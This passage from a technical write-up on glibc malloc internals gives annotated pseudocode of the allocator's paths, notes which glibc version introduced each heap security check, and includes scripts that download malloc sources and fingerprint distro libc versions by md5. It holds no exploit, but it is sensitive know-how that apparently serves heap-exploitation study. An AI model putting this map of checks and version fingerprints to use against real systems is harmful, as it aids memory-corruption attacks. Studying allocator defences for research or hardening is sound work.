                    tcache_put(tc_chunk, tcache_index)

            return chunk2mem(chunk)

    # if size fits in a smallbin and that is not empty, retrieve chunk
    # and put the rest of the chunks into tcache (untill is full)
    if in_smallbin_range(chunk_size):
        smallbin_index = size_to_smallbin_index(chunk_size)
        smallbin = arena.bins[smallbin_index]

        # take last chunk of smallbin
        chunk = smallbin.bk

        # check smallbin entry is not empty
        if chunk != smallbin:

            # SECURITY CHECK (previous v2.23)
            if chunk.bk.fd != chunk:
                raise "malloc(): smallbin double linked list corrupted"

            # unlink from smallbin
            smallbin.bk = chunk.bk
            chunk.bk.fd = smallbin

            # optimization:
            # move the rest of smallbin chunks to the corresponding tcache
            if tcache_index < TCACHE_MAX_BINS:
                while tcache.counts[tcache_index] < TCACHE_FILL_COUNT and \
                    (tc_chunk = smallbin.bk) != smallbin:

                    # mark chunk as in use, since it is going to be moved to
                    # tcache, to avoid consolidation
                    (tc_chunk + chunk_size).mchunk_size |= PREV_INUSE

                    smallbin.bk = tc_chunk.bk
                    tc_chunk.bk.fd = smallbin

                    tcache_put(tc_chunk, tcache_index)

            return chunk2mem(chunk)

    # otherwise a large request was done
    else:
        # take fastbin chunks, consolidate those with next and previous chunks
        # if possible, and put them into the unsorted bin
        malloc_consolidate()

    # variable to indicate to return from tcache once this has been filled
    return_tcached = False

    # variable to indicate the number of chunks inserted in tcache from unsorted
    tcache_unsorted_count = 0


    # The following code will do the next:
    # 1. Try to take from unsorted (and put in tcache smallbin or largebin)
    # 2. Try to take from large bin and split if necessary
    # 3. Try to take from small bin and split if necessary (note that the
    #    previous attempt to take from small bin was done only by exact match)
    # 4. Try one of the following:
    # 4.a. If enough space, use the top chunk (by splitting it)
    # 4.b. If there are fastbins, use malloc_consolidate. Because of this
    #      the outern while True loop is required since new chunks can be
    #      moved to unsorted bin (note that the previous malloc consolidate only
    #      is done if large request).
    # 4.c. As last resort, take memory from the system

    # outer loop require because of malloc_consolidate invocation
    # This loop should only repeat once as max
    while True:

        unsorted_bin = arena.bins[0]
        while (chunk = unsorted_bin.bk) != unsorted_bin:
            ub_chunk_size = chunksize(chunk)
            next_chunk = chunk + ub_chunk_size

            # SECURITY CHECK (previous v2.23)
            # Before version 2.29, this security check raised the error
            # "malloc(): memory corruption"
            if ub_chunk_size <= CHUNK_HDR_SZ or \
               ub_chunk_size > arena.system_mem:
                raise "malloc(): invalid size (unsorted)"

            # SECURITY CHECK (since v2.29)
            if next_chunk.mchunk_size < CHUNK_HDR_SZ or \
               next_chunk.mchunk_size > arena.system_mem:
                raise "malloc(): invalid next size (unsorted)"

            # SECURITY CHECK (since v2.29)
            if (next_chunk.mchunk_prev_size & ~(SIZE_BITS)) != ub_chunk_size:
                raise "malloc(): mismatching next->prev_size (unsorted)"

            # SECURITY CHECK (since v2.29)
            if chunk.bk.fd != chunk or chunk.fd != unsorted_bin:
                raise "malloc(): unsorted double linked list corrupted"

            # SECURITY CHECK (since v2.29)
            if prev_inuse(next_chunk):
                raise "malloc(): invalid next->prev_inuse (unsorted)"

            # if the only chunk in unsorted bin is the last remainder, use it
            if in_smallbin_range(chunk_size) and \
               chunk.bk == unsorted_bin and \
               chunk == arena.last_remainder and \
               ub_chunk_size > (chunk_size + MINSIZE):

                # split chunk in two
                remainder_size = ub_chunk_size - chunk_size
                remainder = chunk + chunk_size
                chunk.mchunk_size = chunk_size | PREV_INUSE


                # set last remainder as only chunk in unsorted bin
                unsorted_bin.bk = unsorted_bin.fd = remainder

                # set new last remainder
                arena.last_remainder = remainder

                # set splitted part as in use
                remainder.mchunk_size |= PREV_INUSE
                (remainder + remainder_size).mchunk_prev_size = remainder_size

                return chunk2mem(chunk)

            # unlink from unsorted bin
            # SECURITY CHECK (since v2.28 until v2.37 inclusive)
            if chunk.bk.fd != chunk:
                raise "malloc(): corrupted unsorted chunks 3"

            unsorted_bin.bk = chunk.bk
            chunk.bk.fd = unsorted_bin

            # found a chunk with the exact size
            if ub_chunk_size == chunk_size:
                (chunk + ub_chunk_size).mchunk_size |= PREV_INUSE

                # if the requested sized match the tcache
                # prefer to fill the tcache to return first exactly matched chunk
                if tcache_index < TCACHE_MAX_BINS and \
                   tcache.counts[tcache_index] < TCACHE_FILL_COUNT:
                   tcache_put(chunk, tcache_index)

                    # indicate to use the tcache to return a chunk if no other
                    # matched chunk is found, after we try to fill it
                    return_tcached = true
                else:
                    return chunk2mem(chunk)


            # insert chunk in smallbin
            if in_smallbin_range(ub_chunk_size):
                sb_index = size_to_smallbin_index(ub_chunk_size)
                smallbin = arena.bins[sb_index]

                # insert in smallbin
                chunk.bk = smallbin
                chunk.fd = smallbin.fd
                smallbin.fd.bk = chunk
                smallbin.fd = chunk

                # mark smallbin as used in binmap
                arena.binmap[idx2block(sb_index)] |= idx2bit(sb_index)


            # insert chunk in large bin
            else:
                lb_index = size_to_largebin_index(ub_chunk_size)
                large_bin = arena.bins[lb_index]

                # bin is not empty
                if large_bin.fd != large_bin:

                    while ub_chunk_size < chunksize(lb_chunk):
                        lb_chunk = lb_chunk.fd_nextsize

                    # if there is chunk of same size, insert in second position
                    if ub_chunk_size == chunksize(lb_chunk):
                        lb_chunk = lb_chunk.fd

                    # else, link chunk sizes
                    else:

                        chunk.fd_nextsize = lb_chunk
                        chunk.bk_nextsize = lb_chunk.bk_nextsize

                        # SECURITY CHECK (since v2.30)
                        if lb_chunk.bk_nextsize.fd_nextsize != lb_chunk:
                            raise "malloc(): largebin double linked list corrupted
                                   (nextsize)"
                        lb_chunk.bk_nextsize = chunk
                        chunk.bk_nextsize.fd_nextsize = chunk

                     # SECURITY CHECK (since v2.30)
                     if lb_chunk.bk.fd != lb_chunk:
                         raise "malloc(): largebin double linked list corrupted
                                (bk)"

                     # link to large bin
                     chunk.bk = lb_chunk.bk
                     chunk.fd = lb_chunk
                     lb_chunk.bk = chunk
                     lb_chunk.bk.fd = chunk

                else:
                    # link sizes
                    chunk.fd_nextsize = chunk
                    chunk.bk_nextsize = chunk

                    # link to large bin
                    chunk.bk = large_bin
                    chunk.fd = large_bin.fd
                    large_bin.bk = chunk
                    large_bin.fd = chunk

                # mark large bin as used in binmap
                arena.binmap[idx2block(lb_index)] |= idx2bit(lb_index)


            tcache_unsorted_count +=1
            if return_tcached and tcache_unsorted_count > tcache_unsorted_limit:
                return tcache_get(tcache_index)


        if return_tcached:
            return tcache_get(tcache_index)


        if not in_smallbin_range(chunk_size):
            lb_index = size_to_largebin_index(chunk_size)
            large_bin = arena.bins[lb_index]
            chunk = large_bin.fd

            # look into large bin if not empty and the largest
            # chunk is bigger than requested size
            if chunk != large_bin and chunksize(chunk) > chunk_size:
                chunk = chunk.bk_nextsize
                while chunksize(chunk) < chunk_size:
                    chunk = chunk.bk_nextsize

            remainder_size = chunksize(chunk) - chunk_size
            unlink_chunk(chunk)

            if remainder_size < MINSIZE:
                (chunk + chunksize(chunk)).mchunk_size |= PREV_INUSE

            # Split and put the remainder in the unsorted list
            else:
                remainder = chunk + chunk_size

                # SECURITY CHECK (previous v2.23)
                if unsorted_bin.fd.bk != unsorted_bin:
                    raise "malloc(): corrupted unsorted chunks"

                link_remainder_to_unsorted_bin(remainder)

            return chunk2mem(chunk)


        # Check small bins and split chunk if necessary
        smallbin = get_smallest_smallbin_with_size(chunk_size)
        if smallbin:
            chunk = smallbin.fd
            remainder_size = chunksize(chunk) - chunk_size
            unlink_chunk(chunk)

            if remainder_size < MINSIZE:
                (chunk + chunksize(chunk)).mchunk_size |= PREV_INUSE
            else:
                remainder = chunk + chunk_size

                # SECURITY CHECK (previous v2.23)
                if unsorted_bin.fd.bk != unsorted_bin:
                    raise "malloc(): corrupted unsorted chunks 2"

                link_remainder_to_unsorted_bin(remainder)

            return chunk2mem(chunk)

        # SECURITY CHECK (since v2.29)
        if chunksize(arena.top) > arena.system_mem:
            raise "malloc(): corrupted top size"

        # use top chunk if enough size
        if chunksize(arena.top) > chunk_size + MINSIZE:
            chunk = arena.top
            remainder_size = chunksize(chunk) - chunk_size
            remainder = chunk + chunk_size
            arena.top = remainder
            remainder.mchunk_size = remainder_size | PREV_INUSE

            (chunk + chunk_size).mchunk_size |= PREV_INUSE

            return chunk2mem(chunk)

        # if some fastbin, move fastbin chunks to unsorted
        else if arena.have_fastchunks:
            malloc_consolidate()
            # after this, we need to check the unsorted bin again
            # so we repeat the cycle
        else:
            # get more memory from system
            chunk = sysmalloc(chunk_size)
            return chunk
```

The next function `unlink_chunk` was introduced in version 2.29 of glibc, since
in previous version this logic was executed by the `unlink` macro. For our
analysis both are the same:
```python
# Before v2.29 was called unlink
def unlink_chunk(chunk):
    # SECURITY CHECK (since v2.26)
    if chunksize(chunk) != prev_size(next_chunk(chunk)):
        raise "corrupted size vs. prev_size"

    # SECURITY CHECK (previous v2.23)
    if chunk.fd.bk != chunk or chunk.bk.fd != chunk:
        raise "corrupted double-linked list"

    chunk.fd.bk = chunk.bk
    chunk.bk.fd = chunk.fd

    # if it is a large bin, unlink the nextsize fields
    if not in_smallbin_range(chunksize(p)) && chunk.fd_nextsize != NULL:

        # SECURITY CHECK (previous v2.23)
        if chunk.fd_nextsize.bk_nextsize != chunk or \
           chunk.bk_nextsize.fd_nextsize != chunk:
            raise "corrupted double-linked list (not small)"

        unlink_nextsize(chunk)
```

```python
def tcache_put(chunk, tcache_index):

    # tcache points to the same address as user data
    entry = chunk2mem(chunk)

    # SECURITY CHECK (since v2.34): tcache key is used to prevent double free
    entry.key = tcache_key

    # SECURITY CHECK (since v2.32): safe-linking is used to prevent tampering
    # pointers
    entry.next = PROTECT_PTR(&entry.next, tcache.entries[tcache_index])

    tcache.entries[tcache_index] = entry
    tcache.counts[tcache_index] += 1
```

```python
# Function to move fastbin chunks to unsorted bin. Moreover the chunks are
# consolidated backward and forward whenever possible.
def malloc_consolidate():

    for fastbin in arena.fastbinsY:
        chunk = *fastbin
        while chunk != NULL:

            # SECURITY CHECK (since v2.32)
            if misaligned_chunk(chunk):
                raise "malloc_consolidate(): unaligned fastbin chunk detected"

            # SECURITY CHECK (since v2.27)
            fb_idx = fastbin_index(chunksize(chunk))
            if arena.fastbinsY[fb_idx] != fastbin:
                raise "malloc_consolidate(): invalid chunk size"

            # SECURITY CHECK (since v2.32): safe-linking
            fd_chunk = REVEAL_PTR(chunk.fd)

            size = chunksize(chunk)

            # consolidate backwards
            if prev_inuse(chunk):
                prevsize = chunk.mchunk_prev_size
                size += prevsize
                chunk = chunk - prevsize

                # SECURITY CHECK (since v2.29)
                if chunksize(chunk) != prevsize:
                    raise "corrupted size vs. prev_size in fastbins"

                unlink_chunk(chunk)

            nextchunk = chunk + size
            nextsize = chunksize(nextchunk)

            # consolidate with top
            if nextchunk == arena.top:
                size += nextsize
                chunk.mchunk_size = size | PREV_INUSE
                arena.top = chunk

            # put in unsorted bin
            else:
                nextinuse = (nextchunk + nextsize).mchunk_size & PREV_INUSE

                # consolidate forward
                if not nextinuse:
                    size += nextsize
                    unlink_chunk(nextchunk)
                # mark chunk as not in use
                else:
                    nextchunk.mchunk_size &= ~PREV_INUSE

                link_to_unsorted(chunk)

```


### Download glibc mallocs

In order to compare malloc versions, the following bash script can be used to
download all the malloc files since v2.23:
```bash
#!/bin/bash

download_malloc () {
    echo "Download malloc $1"
    wget $2 --quiet -O "$1_malloc.c"
}

download_malloc 2.23 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=d20d5955db4d814b73a5b1829d1bc7874c94024d;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf'
download_malloc 2.24 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=1f5f166ea2ecdf601546b4157e3a291dd5c330a4;hb=fdfc9260b61d3d72541f18104d24c7bcb0ce5ca2'
download_malloc 2.25 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=488579390578e09a1a232ac5161daee086dbbd6b;hb=db0242e3023436757bbc7c488a779e6e3343db04'
download_malloc 2.26 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=54e406bcb67478179c9d46e72b63251ad951f356;hb=1c9a5c270d8b66f30dcfaf1cb2d6cf39d3e18369'
download_malloc 2.27 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=f8e7250f70f6f26b0acb5901bcc4f6e39a8a52b2;hb=23158b08a0908f381459f273a984c6fd328363cb'
download_malloc 2.28 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=e247c77b7d4de26e0f2fbec16e352889bac3781b;hb=3c03baca37fdcb52c3881e653ca392bba7a99c2b'
download_malloc 2.29 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=feaf7ee0bf362ed86375c290d7f55a75c3d2edcf;hb=56c86f5dd516284558e106d04b92875d5b623b7a'
download_malloc 2.30 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=00ce48cf5879c87f051af781e9b2d99f384e55dd;hb=0a8262a1b269f8f1602933248e69dfb041aab7a2'
download_malloc 2.31 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=f7cd29bc2f93e1082ee77800bd64a4b2a2897055;hb=9ea3686266dca3f004ba874745a4087a89682617'
download_malloc 2.32 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=ee87ddbbf9c3b8da9f0f6daa84b42b0a6a859fe0;hb=3de512be7ea6053255afed6154db9ee31d4e557a'
download_malloc 2.33 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=1f4bbd8edf8b97701b779f183475565c7d0a6762;hb=9826b03b747b841f5fc6de2054bf1ef3f5c4bdf3'
download_malloc 2.34 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=e065785af77af72c17c773517c15b248b067b4ad;hb=ae37d06c7d127817ba43850f0f898b793d42aea7'
download_malloc 2.35 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=1a1ac1d8f05b6f9bf295d7fdd0f12c2e4650a33c;hb=f94f6d8a3572840d3ba42ab9ace3ea522c99c0c2'
download_malloc 2.36 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=bd3c76ed310c4c2cbf8f141eb6b76182926cf24a;hb=c804cd1c00adde061ca51711f63068c103e94eef'
download_malloc 2.37 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=fd8b52bfac00b1016669c91f0b56cbb4c4c419a1;hb=a704fd9a133bfb10510e18702f48a6a9c88dbbd5'
download_malloc 2.38 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=e2f1a615a4fc7b036e188a28de9cfb132b2351df;hb=36f2487f13e3540be9ee0fb51876b1da72176d3f'
download_malloc 2.39 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=bcb6e5b83ca9777df3c1ade273d821d5b742b2fb;hb=ef321e23c20eebc6d6fb4044425c00e6df27b05f'
download_malloc 2.40 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=bcb6e5b83ca9777df3c1ade273d821d5b742b2fb;hb=3d1aed874918c466a4477af1da35983ab036690e'
download_malloc 2.41 'https://sourceware.org/git?p=glibc.git;a=blob_plain;f=malloc/malloc.c;h=27dfd1eb907f4615b70c70237c42c552bb4f26a8;hb=74f59e9271cbb4071671e5a474e7d4f1622b186f'
```

### glibc heap protections

- **safe-linking**: Since version 2.32. The [safe-linking](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=27dfd1eb907f4615b70c70237c42c552bb4f26a8;hb=74f59e9271cbb4071671e5a474e7d4f1622b186f#l320) allows to protect
  the links of tcache and fastbin chunks. The links are partially xored with the
  address of fd pointer itself, so it is harder for an attacker to hijack those.

- **tcache key** : Since version 2.29. In order to prevent double frees in the
  tcaches, the glibc creates a tcache key, a random value that is located in the
  [tcache_key](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=5ca390cc225c6513cd106a974e8c6ef1baea3130;hb=d2097651cc57834dbfcaa102ddfacae0d86cfb66#l3136) global variable, that is copied in each free chunk that is
  placed in a tcache, specifically in the `uintptr_t key` of
  `tcache_entry`. Therefore when a chunk is going to be freed, the
  glibc checks if the key was already written into the chunk, in order to
  prevent double frees in tcaches. [tcache key check in 2.41](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=27dfd1eb907f4615b70c70237c42c552bb4f26a8;hb=74f59e9271cbb4071671e5a474e7d4f1622b186f#l3258)

- **memory tagging**: Since version 2.33 the glibc implements 
  [memory tagging](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=27dfd1eb907f4615b70c70237c42c552bb4f26a8;hb=74f59e9271cbb4071671e5a474e7d4f1622b186f#l374) for the architectures that support it, that is just
  [aarch64](https://sourceware.org/git/?p=glibc.git;a=blob;f=sysdeps/aarch64/libc-mtag.h;h=e41dc47e62c55b911ce64af0d770883a71c4f026;hb=74f59e9271cbb4071671e5a474e7d4f1622b186f) (ARM 64) by now.

- **security checks**: The glibc implementation incorporate many checks in order
  to detect double-frees and other heap corruptions. Those are exposed in the
  glibc functions summary.


### glibc version in Distros

| Distro       | glibc version | md5                              |
|--------------|---------------|----------------------------------|
| almalinux 8  | 2.28          | 424b06eb0956fb9f44f7780c0d4c6c91 |
| almalinux 9  | 2.34          | 17ab68ce483e81109e3c7d256398837b |
| almalinux 10 | 2.39          | 09c9d2f53c4a32c7fbbfbff9ade2da19 |
| centos 7     | 2.17          | dfbb4b265db5b10a71f952721af3b11b |
| centos 8     | 2.28          | 2cf45eef7a69ebce53877d8c9062922f |
| debian 8     | 2.19          | 8548e4731a83e6ed3fc167633d28c21f |
| debian 9     | 2.24          | 3e5c9b44fc491e6dd5e480fcb316bf2d |
| debian 10    | 2.28          | ccf803fb39e0acfb98d605f09adeb034 |
| debian 11    | 2.31          | 622fdef02b0fbca5cef07366e4eeb387 |
| debian 12    | 2.36          | c94f3442432d6b3885d3c18320fd9d45 |
| debian 13    | 2.41          | f688b13e6d1f5845fd77eae4cf2cd040 |
| fedora 20    | 2.18          | 45ec89d175e588d1623d818cfe91ba36 |
| fedora 21    | 2.20          | 8bc04d7d4b29de8d4775093a4a202a60 |
| fedora 22    | 2.21          | ac11f062aa3a990418c555bc140c53f1 |
| fedora 23    | 2.22          | 04016638d87a3cdceaff105d0cde715c |
| fedora 24    | 2.23          | 8e8a8db3d0e027f39f267d395aa0d3aa |
| fedora 25    | 2.24          | 9e428a7083f073e2872a730cc9ac0a51 |
| fedora 26    | 2.25          | ed8753bf1cb4b8d5c8bcfb52114b0b74 |
| fedora 27    | 2.26          | ea5811cf1f47dfe43abf29e1c2650acb |
| fedora 28    | 2.27          | 6b3feaf81077f8ae4c784fcd2fb4e1c3 |
| fedora 29    | 2.28          | 64b7a8f08649f1e0600b237db2f9f73d |
| fedora 30    | 2.29          | b1c33190f3d69282734203b41392d60a |
| fedora 31    | 2.30          | 60e52e8d6fcbf10498cb5947e369e2c5 |
| fedora 32    | 2.31          | c8ec92f2964cf3df66571d69883e87ed |
| fedora 33    | 2.32          | 3141d87f21a58c9f330e0a25d54ecd69 |
| fedora 34    | 2.33          | 3bb919457c15e8b542440cfa4e7f77ba |
| fedora 35    | 2.34          | 186d332efa89d9a0c089cc7b83912b28 |
| fedora 36    | 2.35          | 019b45147c4f5ebde17ba6a9e9eeaa8d |
| fedora 37    | 2.36          | 576cec2e93b8e2ece9d2de18d74a4534 |
| fedora 38    | 2.37          | 91246bf2585f35a1dc7889656688fda3 |
| fedora 39    | 2.38          | f669172024179032ce108a2839545a00 |
| fedora 40    | 2.39          | e0c0c379bf8f5109bd531297bb2499fe |
| fedora 41    | 2.40          | 504f2e554b70530e567f1525fc790032 |
| fedora 42    | 2.41          | 317ed4c776da3e62cde8de5b422b46d5 |
| fedora 43    | 2.42          | fc953cdd3ae07bd05d982b51c78ce21e |
| ubuntu 14.04 | 2.19          | 38e08babacc365376f6c07bb21e00b01 |
| ubuntu 16.04 | 2.23          | b0097c8a9284b03b412ff171c3d3c9cc |
| ubuntu 17.04 | 2.24          | 82ff57d04eb11340b072a4996e7bf89f |
| ubuntu 18.04 | 2.27          | 48e708bb157196b4cc1ffb68fc66fa17 |
| ubuntu 19.04 | 2.29          | 2fb0d6800d4d79ffdc7a388d7fe6aea0 |
| ubuntu 20.04 | 2.31          | 570a4d2f670e339ca78a438141a2e2dd |
| ubuntu 21.04 | 2.33          | 66fbedb37b12687bdccb9e95b1d0a176 |
| ubuntu 22.04 | 2.35          | 0d915c4f0cd7b6992ba9426b44e0c48b |
| ubuntu 23.04 | 2.37          | b9f3f15f5095efaaf0b1a48d3492f5e5 |
| ubuntu 24.04 | 2.39          | 289071786eab0c1910da49b2b1bfd377 |
| ubuntu 25.04 | 2.41          | 92270af625e986388566aafd5fb6a9bc |
|              |               |                                  |

The table can be generated with the following script (docker required):
```sh
#!/bin/bash

versions=()

# Add alma linux versions
for i in {8..10}; do
    versions+=("almalinux:$i")
done

# Add centos versions
for i in {7..8}; do
    versions+=("centos:$i")
done

# Add debian versions
for i in {8..13}; do
    versions+=("debian:$i")
done

# Add fedora versions
for i in {20..43}; do
    versions+=("fedora:$i")
done

# Add ubuntu versions
for i in {14..25}; do
    versions+=("ubuntu:$i.04")
done


for l in "${versions[@]}"; do
    echo "== $l ==" 1>&2
    distro=$(echo "$l" | cut -d ':' -f 1)
    distro_version=$(echo "$l" | cut -d ':' -f 2)
    libc_version=$(sudo docker run $l ldd --version | grep -i libc | head -1 | awk '{print $NF}')

    md5=$(sudo docker run $l md5sum /lib/x86_64-linux-gnu/libc.so.6 | cut -d ' ' -f 1)
    if [ -z "$md5" ]; then
        md5=$(sudo docker run $l md5sum /lib64/libc.so.6 | cut -d ' ' -f 1)
    fi

    echo "| $distro $distro_version | $libc_version | $md5 |"
done
```

## Resources

- [how2heap](https://github.com/shellphish/how2heap)
